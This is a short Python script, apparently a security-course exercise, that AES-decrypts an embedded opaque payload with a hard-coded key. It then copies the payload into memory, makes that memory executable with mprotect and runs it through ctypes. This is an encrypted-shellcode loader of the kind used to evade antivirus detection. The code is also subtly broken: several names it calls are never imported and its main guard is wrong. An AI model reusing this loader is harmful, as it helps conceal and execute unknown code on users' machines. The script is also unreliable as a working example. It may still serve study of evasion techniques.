#!/usr/bin/env python

####################################################
#
# shellcode-decrypter.py
# by Michael Born (@blu3gl0w13)
# Student ID: SLAE-744
# September 26, 2016
#
####################################################

# Imports

import Crypto
import sys
#import argparse
import os
import hashlib
import ctypes

#---------------------------------------
#
# Define our Encryption Functions
#
#--------------------------------------

def aesDecrypter(key, IV, shellcode, salt):
  hashedKey = hashlib.sha256(key + salt).digest()
  mode = AES.MODE_CBC
  initVector = IV
  decrypterObject = AES.new(hashedKey, AES.MODE_CBC, initVector)
  messageToDecrypt = shellcode
  clearText = decrypterObject.decrypt(messageToDecrypt)
  #print "\n\n[+] RAW AES Decrypted Shellcode (non hex encoded): \n\"%s\"\n\n" % clearText
  return clearText
  sys.exit(0)

def main():
  # Setup the argument parser


  # Prepare some objects
  encryptedPayload = "a53c9b1f161a190e121895a41cc11f2f8e5dd83bb77eab0f6eedb5bbe19330d63056c95af97fd2642c7ff24af281a61108c46def782cd3c46ce0a0bd74468c51cf4aa1327b5704854d5cc409b8a4cd5a8a4e2c7069f5ec2080b2403e1ea994bf5c4db342987ee217a4292ed4a0b5a5517f6344063ac3d51f32a1c78618bd346b8c7f70ff1dced246ecffb9f9ecdc9acb4e9dccfbe87bade5c7c9fa95499b387d"
  IV = encryptedPayload.decode('hex')[:16]
  salt = encryptedPayload.decode('hex')[16:32]
  key = 'slae32'
  shellcode = encryptedPayload.decode('hex')[32::]

  decrypted = aesDecrypter(key, IV, shellcode, salt)


  # now we need to run our shellcode from here

  # use ctypes.CDLL to load /lib/i386-linux-gnu/libc.so.6

  libC = CDLL('libc.so.6')

  #print decrypted
  code = c_char_p(decrypted)
  sizeOfDecryptedShellcode = len(decrypted)

  # now we need to setup our void *valloc(size_t size) and get our pointer to allocated memory

  memAddrPointer = c_void_p(libC.valloc(sizeOfDecryptedShellcode))

  # now we need to move our code into memory using memmove 
  # void *memmove(void *dest, const void *src, size_t n)

  codeMovePointer = memmove(memAddrPointer, code, sizeOfDecryptedShellcode)


  # now we use mprotect to make sure we have read, write, and execute permisions in memory
  # R, WR, X = 0x7

  protectMemory = libC.mprotect(memAddrPointer, sizeOfDecryptedShellcode, 7)


  # now we set up a quick execution for our shellcode using cast ctypes.cast = cast(obj, typ)
  # we'll have to call ctypes.CFUNCTYPE to identify memAddrPointer as void * (c_void_p) type

  run = cast(memAddrPointer, CFUNCTYPE(c_void_p))
  run()




if __name__ != main:
  main()
